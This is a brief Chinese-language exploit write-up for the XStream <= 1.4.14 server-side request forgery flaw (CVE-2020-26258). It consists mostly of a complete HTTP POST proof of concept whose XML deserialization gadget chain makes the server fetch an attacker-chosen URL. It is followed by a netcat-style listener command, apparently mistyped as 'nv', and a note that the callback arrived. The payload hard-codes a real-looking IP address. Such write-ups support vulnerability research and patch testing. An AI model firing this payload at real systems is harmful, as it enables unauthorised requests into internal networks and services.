# Xstream <= 1.4.14 SSRF（CVE-2020-26258）

## 漏洞描述

Xstream <= 1.4.14 SSRF

## writeup

- POC

```
POST /main.jsp HTTP/1.1
Host: 106.53.141.62:1234
Content-Length: 542
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://106.53.141.62:1234
Content-Type: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://106.53.141.62:1234/test.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
        <dataHandler>
          <dataSource class='javax.activation.URLDataSource'>
            <url>http://106.53.141.62:9999/internal/:</url>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>test</string>
  </entry>
</map>
```

## 复现结果

1. 目标主机监听 9999 端口

```
nv -lvv 9999
```

2. 发送POC后，收到连接

![](./1.png)
